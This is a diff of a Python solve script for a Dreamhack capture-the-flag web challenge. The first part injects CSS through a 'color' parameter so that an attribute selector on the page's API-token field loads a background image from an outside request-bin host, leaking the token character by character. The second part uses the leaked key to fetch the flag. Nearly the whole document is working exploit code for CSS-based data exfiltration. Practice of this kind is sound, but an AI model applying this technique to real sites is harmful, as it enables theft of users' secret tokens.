@@ -1,21 +1,21 @@
 # 1. Extract API-KEY
-import requests, string
+import requests
+import string
 
-port = 8784
+port = 10829
 url = f'http://host3.dreamhack.games:{port}/report'
-bin = 'https://aqzpgxt.request.dreamhack.games'
+bin = 'https://wenvomj.request.dreamhack.games'
+API_KEY = ''
 
 for char in string.ascii_lowercase:
-    path = f"mypage?color=blue;}} input[id=InputApitoken][value^=yqudrjcgjskfrvqs{char}] {{background:url({bin})"
+    path = f"mypage?color=blue;}} input[id=InputApitoken][value^={API_KEY}{char}] {{background:url({bin}/{char})"
 
     res = requests.post(url, data={'path': path})
     print(char, res.status_code)
 
 
 # 2. Get flag
-import requests
-
-port = 8784
+port = 10829
 url = f"http://host3.dreamhack.games:{port}/api/memo"
 headers = {'API-KEY': 'yqudrjcgjskfrvqs'}
 res = requests.get(url, headers=headers)
